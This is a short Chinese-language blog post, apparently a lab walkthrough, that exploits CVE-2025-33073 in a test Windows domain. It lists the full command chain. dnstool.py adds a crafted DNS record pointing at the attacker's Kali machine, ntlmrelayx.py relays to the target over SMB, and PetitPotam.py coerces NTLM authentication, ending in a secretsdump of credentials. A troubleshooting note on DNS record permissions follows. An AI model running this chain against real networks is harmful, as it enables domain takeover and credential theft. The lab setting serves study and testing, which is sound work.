---
title: "CVE-2025-33073"
date: 2025-10-27 09:45:23 +0800
category: 代码审计
tags: [内网,域]
excerpt: CVE-2025-33073
---
- 域：v.com
- 域控：10.10.10.135
- 攻击者机器：10.10.10.153(kali)
- 攻击目标： accatk.v.com (10.10.10.138)
- 普通域用户：0617

## 手工

- 创建一个特殊DNS记录，指向攻击者的机器10.10.10.153(kali)

```
dnstool.py -u 'v.com\0617' -p '111111aA!' 10.10.10.135 -a add -d 10.10.10.153 -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'

```

![image-20250617233301057](imgs/CVE-2025-33073/image-20250617233301057.png)

- 验证dns记录

```
python3 dnstool.py -u "v.com\0617" -p "111111aA!" 10.10.10.135 -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA --action query -d 10.10.10.153
```

![image-20250617233852533](imgs/CVE-2025-33073/image-20250617233852533.png)

也可以dig

![image-20250617233725016](imgs/CVE-2025-33073/image-20250617233725016.png)

- 进行监听，攻击目标机器

```
ntlmrelayx.py -t "smb://accatk" -smb2support -ts
```

- 进行强制触发，让目标机器向指定DNS记录进行NTLM认证

```
PetitPotam.py -d v.com -u 0617 -p '111111aA!' localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA accatk
```

![image-20250617233424583](imgs/CVE-2025-33073/image-20250617233424583.png)

- 成功secretsdump

![image-20250617233525134](imgs/CVE-2025-33073/image-20250617233525134.png)

## 排错

`nTSecurityDescriptor`可以看到谁对这条dns记录有管理权限,有管理权限的用户可以在此直接修改记录

![image-20250619152809816](imgs/CVE-2025-33073/image-20250619152809816.png)

![image-20250619152940741](imgs/CVE-2025-33073/image-20250619152940741.png)
